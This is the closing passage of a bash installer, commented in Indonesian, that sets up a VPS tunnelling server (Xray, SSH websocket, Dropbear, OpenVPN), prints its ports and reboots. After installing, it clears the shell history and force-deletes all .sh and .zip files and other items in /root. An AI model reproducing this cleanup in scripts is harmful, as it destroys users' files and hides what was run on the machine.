        if systemctl is-active --quiet "$service_name"; then
            print_success "Layanan $service_name berhasil diaktifkan dan dimulai."
        else
            print_error "Gagal mengaktifkan atau memulai layanan $service_name. Mohon periksa log."
        fi
    done

    echo ""
    print_success "Semua layanan penting berhasil diaktifkan."
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

# Fingsi Install Script
function instal(){
clear
    first_setup
    nginx_install
    base_package
    make_folder_xray
    pasang_domain
    password_default
    pasang_ssl
    install_xray
    ssh
    udp_mini
    limit_quota
    #ssh_slow
    ssh_udp
    ins_SSHD
    ins_dropbear
    ins_vnstat
    ins_openvpn
    ins_backup
    ins_swab
    ins_Fail2ban
    ins_epro
    DDoS_Deflate
    ins_restart
    menu
    profile
    enable_services
}
instal
echo ""
history -c
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
rm -rf /root/domain
#sudo hostnamectl set-hostname $user
secs_to_human "$(($(date +%s) - ${start}))"
echo ""
samawa
echo " "
echo -e " ${green}┌─────────────────────────────────────────────────────┐"
echo -e " ${green}│${NC}       >>> Service & Port                            ${green}│${NC}"
echo -e " ${green}│${NC}   - Open SSH                : 22                    ${green}│${NC}"
echo -e " ${green}│${NC}   - UDP SSH                 : 1-65535               ${green}│${NC}"
echo -e " ${green}│${NC}   - Dropbear                : 443, 109, 143         ${green}│${NC}"
echo -e " ${green}│${NC}   - Dropbear Websocket      : 443, 109              ${green}│${NC}"
echo -e " ${green}│${NC}   - SSH Websocket SSL       : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - SSH Websocket           : 80                    ${green}│${NC}"
echo -e " ${green}│${NC}   - OpenVPN SSL             : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - OpenVPN Websocket SSL   : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - OpenVPN TCP             : 443, 1194             ${green}│${NC}"
echo -e " ${green}│${NC}   - OpenVPN UDP             : 2200                  ${green}│${NC}"
echo -e " ${green}│${NC}   - Nginx Webserver         : 443, 80, 81           ${green}│${NC}"
echo -e " ${green}│${NC}   - Haproxy Loadbalancer    : 443, 80               ${green}│${NC}"
echo -e " ${green}│${NC}   - DNS Server              : 443, 53               ${green}│${NC}"
echo -e " ${green}│${NC}   - DNS Client              : 443, 88               ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY (DNSTT/SLOWDNS)    : 443, 53               ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY Vmess TLS          : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY Vmess gRPC         : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY Vmess None TLS     : 80                    ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY Vless TLS          : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY Vless gRPC         : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - XRAY Vless None TLS     : 80                    ${green}│${NC}"
echo -e " ${green}│${NC}   - Trojan gRPC             : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - Trojan WS               : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - Shadowsocks WS          : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}   - Shadowsocks gRPC        : 443                   ${green}│${NC}"
echo -e " ${green}│${NC}                                                     ${green}│${NC}"
echo -e " ${green}│${NC}      >>> Server Information & Other Features        ${green}│${NC}"
echo -e " ${green}│${NC}   - Timezone                : Asia/Jakarta (GMT +7) ${green}│${NC}"
echo -e " ${green}│${NC}   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        ${green}│${NC}"
echo -e " ${green}│${NC}   - Auto Delete Expired Account                     ${green}│${NC}"
echo -e " ${green}│${NC}   - Fully Automatic Script                          ${green}│${NC}"
echo -e " ${green}│${NC}   - Vps Settings                                    ${green}│${NC}"
echo -e " ${green}│${NC}   - Admin Control                                   ${green}│${NC}"
echo -e " ${green}│${NC}   - Restore Data                                    ${green}│${NC}"
echo -e " ${green}│${NC}   - Full Orders For Various Services                ${green}│${NC}"
echo -e " ${green}└─────────────────────────────────────────────────────┘${NC}"
echo ""
echo ""
echo "" | tee -a log-install.txt
echo -e ""
#sudo hostnamectl set-hostname $username
echo -e "${green} Script Successfull Installed"
echo ""
read -p "$( echo -e "Press ${YELLOW}[ ${NC}${YELLOW}Enter${NC} ${YELLOW}]${NC} For Reboot") "
reboot
